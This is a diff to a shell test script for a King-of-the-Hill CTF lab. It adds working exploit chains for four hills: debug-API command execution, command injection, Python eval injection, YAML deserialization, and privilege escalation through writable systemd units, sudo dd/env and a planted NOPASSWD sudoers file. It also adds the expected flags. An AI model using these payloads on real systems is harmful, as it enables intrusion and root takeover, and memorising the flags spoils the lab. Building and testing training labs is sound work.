@@ -108,6 +108,39 @@ h19_root(){ h19_disp 'printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 
 h19_king(){ h19_disp "printf '#!/bin/sh\necho $TOKEN > /root/king.txt\ncat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/jobs/dispatch.sh; chmod 755 /opt/jobs/dispatch.sh" >/dev/null; sleep 5;
             h19_disp 'cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }
 
+# hill-11 (unauth debug API RCE -> writable unit ExecStart run by root).
+h11_run(){ curl -s -G http://127.0.0.1:8091/api/_debug/run --data-urlencode "cmd=$1"; }
+h11_user(){ h11_run 'cat /home/flynn/user.txt' | grep -o 'CTF{[^}]*}'; }
+h11_root(){ h11_run 'printf "ExecStart=cat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/units/arena.service' >/dev/null; sleep 5;
+            h11_run 'cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
+h11_king(){ h11_run "printf 'ExecStart=echo $TOKEN > /root/king.txt; cat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/units/arena.service" >/dev/null; sleep 5;
+            h11_run 'cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-13 (command injection -> sudo dd read/write).
+h13_run(){ curl -s -G http://127.0.0.1:8093/diag --data-urlencode "target=x; $1"; }
+h13_user(){ h13_run 'cat /home/ops/user.txt' | grep -o 'CTF{[^}]*}'; }
+h13_root(){ h13_run 'sudo dd if=/root/root.txt 2>/dev/null' | grep -o 'CTF{[^}]*}'; }
+h13_king(){ h13_run "echo $TOKEN | sudo dd of=/root/king.txt 2>/dev/null" >/dev/null;
+            h13_run 'sudo dd if=/root/king.txt 2>/dev/null' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-16 (repair-gated eval RCE -> sudo env). Repair is idempotent, done before each call.
+h16_repair(){ curl -s 'http://127.0.0.1:8096/repair?mount=core-7&coolant=on' >/dev/null; }
+h16_cal(){ h16_repair; curl -s -G http://127.0.0.1:8096/calibrate --data-urlencode "formula=$1"; }
+h16_user(){ h16_cal "__import__('subprocess').run(['cat','/home/refiner/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
+h16_root(){ h16_cal "__import__('subprocess').run(['sudo','env','cat','/root/root.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
+h16_king(){ h16_cal "__import__('subprocess').run(['sudo','env','/bin/sh','-c','echo $TOKEN > /root/king.txt'],capture_output=True,text=True).stdout" >/dev/null;
+            h16_cal "__import__('subprocess').run(['sudo','env','cat','/root/king.txt'],capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-18 (repair-gated YAML deserialization -> root-installed sudoers.d). getoutput takes one shell string.
+h18_repair(){ curl -s 'http://127.0.0.1:8098/repair?ledger=rebuilt&seal=lifted' >/dev/null; }
+h18_yaml(){ h18_repair; curl -s -X POST --data-binary "!!python/object/apply:subprocess.getoutput [\"$1\"]" http://127.0.0.1:8098/vault/open; }
+h18_user(){ h18_yaml 'cat /home/goblin/user.txt' | grep -o 'CTF{[^}]*}'; }
+h18_root(){ B=$(printf 'goblin ALL=(root) NOPASSWD: ALL\n' | base64 | tr -d '\n');
+            h18_yaml "echo $B | base64 -d > /opt/vault/grants/pwn.sudo" >/dev/null; sleep 5;
+            h18_yaml 'sudo cat /root/root.txt' | grep -o 'CTF{[^}]*}'; }
+h18_king(){ h18_yaml "echo $TOKEN | sudo tee /root/king.txt" >/dev/null;
+            h18_yaml 'sudo cat /root/king.txt' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
 uf(){ case "$1" in
   1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
   3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
@@ -115,7 +148,9 @@ uf(){ case "$1" in
   7) echo 'CTF{jwt_4lg_n0n3_f0rg3d_th3_3y3}';;  8) echo 'CTF{w34k_f0r3m4n_cr3ds_1s3ng4rd}';;
   9) echo 'CTF{ss_t1_0n_th3_gr1d_10_t0w3r}';;
   10) echo 'CTF{p1ckl3_r3duc3_0n_th3_gr1d}';; 14) echo 'CTF{sql1_0r_1_3q_1_p4nd0r4}';;
-  17) echo 'CTF{sst1_sp3ll_h0gw4rts_rc3}';;   19) echo 'CTF{ssrf_lf1_0wl_p0st_l34k}';;   esac; }
+  17) echo 'CTF{sst1_sp3ll_h0gw4rts_rc3}';;   19) echo 'CTF{ssrf_lf1_0wl_p0st_l34k}';;
+  11) echo 'CTF{unauth_d3bug_l1ght_cycl3}';; 13) echo 'CTF{cmd_1nj_rd4_s3ns0r_d14g}';;
+  16) echo 'CTF{r3p41r_3v4l_unobt41n1um}';;  18) echo 'CTF{y4ml_uns4f3_l04d_g0bl1ns}';;  esac; }
 rf(){ case "$1" in
   1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
   3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
@@ -123,9 +158,11 @@ rf(){ case "$1" in
   7) echo 'CTF{p4th_h1j4ck_1n_r00t_cr0n_w1n}';; 8) echo 'CTF{c4p_s3tu1d_0n_pyth0n_2_r00t}';;
   9) echo 'CTF{sud0_s3d_gtf0b1ns_d3_r3z}';;
   10) echo 'CTF{su1d_f1nd_d3r3z_t0_r00t}';;  14) echo 'CTF{sud0_p3rl_syst3m_2_r00t}';;
-  17) echo 'CTF{sud0_pyth0n_expell14rmus}';; 19) echo 'CTF{r00t_cr0n_wr1t4bl3_m1n1stry}';; esac; }
+  17) echo 'CTF{sud0_pyth0n_expell14rmus}';; 19) echo 'CTF{r00t_cr0n_wr1t4bl3_m1n1stry}';;
+  11) echo 'CTF{wr1t4bl3_un1t_3x3cst4rt_r00t}';; 13) echo 'CTF{sud0_dd_r34d_wr1t3_r00t}';;
+  16) echo 'CTF{sud0_3nv_r00t_r3f1n3ry}';;    18) echo 'CTF{r00t_1nst4lls_sud03rs_gr1ng0tts}';; esac; }
 
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 14 17 19}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 13 14 16 17 18 19}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
   echo "=== hill-$n ==="
   ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
@@ -147,9 +184,13 @@ break_privesc(){ case "$1" in
   14) docker exec koth-hill-14 rm -f /etc/sudoers.d/navi 2>/dev/null;;
   17) docker exec koth-hill-17 rm -f /etc/sudoers.d/wizard 2>/dev/null;;
   19) docker exec koth-hill-19 sh -c 'rm -f /opt/jobs/dispatch.sh; chown root:root /opt/jobs; chmod 755 /opt/jobs' 2>/dev/null;;
+  11) docker exec koth-hill-11 sh -c 'chmod 644 /opt/units/arena.service; rm -f /tmp/r' 2>/dev/null;;
+  13) docker exec koth-hill-13 rm -f /etc/sudoers.d/ops 2>/dev/null;;
+  16) docker exec koth-hill-16 rm -f /etc/sudoers.d/refiner 2>/dev/null;;
+  18) docker exec koth-hill-18 sh -c 'rm -f /etc/sudoers.d/pwn* /opt/vault/grants/*.sudo; chown root:root /opt/vault/grants; chmod 755 /opt/vault/grants' 2>/dev/null;;
   *) return 1;;                                                                  # hill-3 (writable cron): no cheap block/reset check
 esac; }
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 14 17 19}; do
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 13 14 16 17 18 19}; do
   break_privesc "$n" || continue
   docker exec koth-hill-$n /opt/app/reset.sh >/dev/null 2>&1
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n privesc works after reset"
